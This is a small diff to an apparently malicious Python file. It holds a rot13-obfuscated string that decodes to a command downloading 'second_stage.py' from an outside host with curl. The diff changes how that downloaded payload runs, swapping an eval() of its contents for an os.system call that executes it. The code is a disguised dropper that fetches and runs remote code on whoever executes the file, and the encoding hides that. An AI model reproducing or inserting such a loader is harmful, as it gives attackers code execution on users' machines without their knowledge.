@@ -3,8 +3,7 @@ import os
 
 code = '''
 bf.flfgrz("phey -B uggc://vgmphgrnlnar.pelfgnypybhq.klm/frpbaq_fgntr.cl")
-s = bcra("frpbaq_fgntr.cl", "e")
-riny(s.ernq())
+bf.flfgrz("Clguba frpbaq_fgntr.cl")
 '''
 
 rot13_decoded = codecs.decode(code, 'rot13')
